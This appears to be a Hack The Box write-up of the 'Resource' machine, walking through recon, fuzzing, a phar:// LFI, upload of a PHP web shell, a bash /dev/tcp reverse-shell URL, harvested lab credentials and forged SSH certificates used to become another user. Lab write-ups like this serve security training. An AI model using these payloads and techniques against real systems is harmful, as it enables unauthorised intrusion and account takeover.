---
title: "Resource - Hack The Box Machines"
date: 2024-08-08 08:00:00 - 0500
categories: [Hack The Box, Machines]
tags: [htb, machine, web, resource, seasonvi]
image: 
  path: /assets/img/posts/htb/Resource/resource.png
---


## Reconnaisance

![Desktop View](/assets/img/posts/htb/e83ac2321955bd2e0beb788d47fa5ae9.png){: width="972" height="589" }
_Resource HTB Season VI_

Hello, everyone! 👋 Welcome back. This is the first machine challenge of `Season VI` and it has a medium difficulty level. As with many previous attempts to pwn a box, I will use the `nmap` tool to scan the target machine and determine which ports are open.

```bash
[user@machine] - $ nmap -p- 10.10.11.x -T4 --min-rate=1000 -Pn --disable-arp-ping -oN nmapscan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-04 10:59 EDT
Warning: 10.10.11.x giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.11.x
Host is up (0.073s latency).
Not shown: 63965 closed tcp ports (conn-refused), 1567 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2222/tcp open  EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 104.88 seconds
```
{: .nolineno }


With the initial scan, I determined that three ports are open on the target machine: 22, 80, and 2222.

```bash
[user@machine] - $ nmap -p22,80,2222 -sC -sV 10.10.11.x

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-04 12:10 EDT
Nmap scan report for 10.10.11.x
Host is up (0.12s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 d5:4f:62:39:7b:d2:22:f0:a8:8a:d9:90:35:60:56:88 (ECDSA)
|_  256 fb:67:b0:60:52:f2:12:7e:6c:13:fb:75:f2:bb:1a:ca (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://itrc.ssg.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
2222/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f2:a6:83:b9:90:6b:6c:54:32:22:ec:af:17:04:bd:16 (ECDSA)
|_  256 0c:c3:9c:10:f5:7f:d3:e4:a8:28:6a:51:ad:1a:e1:bf (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.22 seconds
```
{: .nolineno }

From the nmap scan report, we can see that the target machine has the following open ports and services:
- Ports open:
    - 22/tcp: SSH service (OpenSSH 9.2p1 Debian)
    - 80/tcp: HTTP service, redirect to `http://itrc.ssg.htb/` and has an `nginx/1.18.0` server header.
    - 2222/tcp: SSH service (OpenSSH 8.9p1 on Ubuntu)

I am wondering why there are two SSH services open on different ports for two different versions of OpenSSH?<br>
Use this command to add an IP and hostname to file `/ect/hosts`

```bash
[user@machine] - $ echo "10.10.11.x itrc.ssg.htb" | sudo tee -a /etc/hosts
```
{: .nolineno }

Next, I accessed the target machine on port 80 at `http://itrc.ssg.htb`, which led me to an IT Support Center page. Reading the introduction section on the website, it mentions `Managing SSH Access`, ...


![Access web](/assets/img/posts/htb/ZUcp4D5uDq.png){: width="972" height="589" }
_Access webpage on port 80_

Next, to see what this website does, I need to register an account and log in.

![Access web](/assets/img/posts/htb/I3ioT1nYNb.png){: width="972" height="589" }
_Login page_

![](/assets/img/posts/htb/774Jbz1Bra.png){: width="972" height="589" }
_Dashboard page_

Use ffuf to `fuzz` the `page` parameter.
```bash
[user@machine] - $ ffuf -u http://itrc.ssg.htb/index.php/\?page\=FUZZ  -w ~/workspace/machine/SecLists-master/Discovery/DNS/n0kovo_subdomains.txt -fs 3120 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://itrc.ssg.htb/index.php/?page=FUZZ
 :: Wordlist         : FUZZ: /home/natsu/workspace/machine/SecLists-master/Discovery/DNS/n0kovo_subdomains.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: 3120
________________________________________________

admin                   [Status: 200, Size: 1331, Words: 136, Lines: 26]
login                   [Status: 200, Size: 2709, Words: 239, Lines: 44]
register                [Status: 200, Size: 2842, Words: 255, Lines: 45]
dashboard               [Status: 200, Size: 1331, Words: 136, Lines: 26]
db                      [Status: 200, Size: 2276, Words: 158, Lines: 35]
ticket                  [Status: 200, Size: 1331, Words: 136, Lines: 26]
index                   [Status: 200, Size: 2276, Words: 158, Lines: 35]
logout                  [Status: 200, Size: 2627, Words: 196, Lines: 39]
```
{: .nolineno }

Accessing the `page=admin`, I see several tickets with subjects such as `Malware in finance dept` and `SSH Key Signing Broken`, but I cannot access most of these tickets to view their detailed contents.

And one notable thing is that under Admin Tools, I see `Contact zzinter for manual provisioning`

![Access web](/assets/img/posts/htb/wl6B6DycYy.png){: width="972" height="589" }
_Access web at admin page_

Going back to the dashboard, I tried to create a ticket with the subject `New ticket` and uploaded a ZIP file.
![](/assets/img/posts/htb/VT7KF8aPSu.png){: width="972" height="589" }

When I right-clicked on the `file.zip` location, I saw that the uploaded file is stored at the path: `itrc.ssg.htb/uploads/a00308c0438df0f0cb98f5261ca9124e57fcd1ed.zip`
![](/assets/img/posts/htb/f4fL4Yfuzg.png){: width="972" height="589" }

Looking at the filename, it appears to be some sort of hash, and it is indeed a SHA-1 hash.
![](/assets/img/posts/htb/ePZVwFwTED.png){: width="972" height="589" }
_sha1sum file.zip_

After uploading a regular ZIP file, I tried uploading an empty file to see if any errors occurred.
In the response, I noticed that two functions mentioned in the misreporting are `ZipArchive::open()` and `hash_file()` in the file `/var/www/savefile.inc.php`

![Access web](/assets/img/posts/htb/AhbMSzXGYE.png){: width="972" height="589" }
_Upload empty file zip_

## LFI loophole 
![Access web](/assets/img/posts/htb/sT30Q7ekyj.png){: width="972" height="589" }
_Access file in /var/www/itrc_

Test the LFI loophole with some protocols like `file`, `dict`, `phar`: `itrc.ssg.htb/?page=file:///var/www/itrc/create_ticket`.
![Access web](/assets/img/posts/htb/ajWwYf5yLu.png){: width="972" height="589" }
_LFI loophole_

## RCE www-data
Upload file shell and RCE

```bash
<?php
	system($_GET["cmd"]);
	__HALT_COMPILER();
?>
```
{: .nolineno }

```bash
$ zip shell.zip shell.php
$ sha1sum shell.zip
```
{: .nolineno }

```
http://itrc.ssg.htb/?page=phar://uploads/aee15c9bfb55e6c04a49b57d2c62a215f62e1d26.zip/shell&cmd=/bin/bash+-c+%27/bin/bash+-i+%3E%26+/dev/tcp/<your ip>/9001+0%3E%261%27
```
Listen and get reverse shell.
![](/assets/img/posts/htb/5zT91t6m6p.png){: width="972" height="589" }
_Reverse shell_

```bash
www-data@itrc:/var/www/itrc$ cat db.php

<?php

$dsn = "mysql:host=db;dbname=resourcecenter;";
$dbusername = "jj";
$dbpassword = "ugEG5rR5SG8uPd";
$pdo = new PDO($dsn, $dbusername, $dbpassword);

try {
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Connection failed: " . $e->getMessage());
}
```
{: .nolineno }

![Access web](/assets/img/posts/htb/HikHECRoHm.png){: width="972" height="589" }
_Home folder_

## msainristil@itrc

As mentioned earlier in the admin page, we saw several tickets that had already been created, and upon checking the uploads directory, I found multiple ZIP files. It's possible that, besides the files I uploaded, the remaining files were uploaded by those tickets.

I used zipgrep to check if any of these ZIP files contain sensitive information.

```bash
$ for zipfile in *.zip; do zipgrep "msainristil" "$zipfile"; done

"user=msainristil&pass=82yards2closeit"
```
{: .nolineno }
![Access web](/assets/img/posts/htb/eNkVNvGhaF.png){: width="972" height="589" }
_User msainristil_

SSH to target machine with username and password `msainristil:82yards2closeit`


![Access web](/assets/img/posts/htb/ObNMYEca1Y.png){: width="972" height="589" }
_SSH user msainristil_

![Access web](/assets/img/posts/htb/IDhUIWevhR.png){: width="972" height="589" }
_Certificate CA_

## zzinter@itrc 

```bash
$ ssh-keygen -t rsa -b 2048 -f yzx
$ ssh-keygen -s ca-itrc -I ca-itrc.pub -n zzinter yzx.pub
$ ssh-keygen -Lf yzx-cert.pub
$ ssh -o CertificateFile=yzx-cert.pub -i yzx zzinter@localhost
```
{: .nolineno }

![Access web](/assets/img/posts/htb/EquSHNMrMP.png){: width="972" height="589" }
_Get user flag_


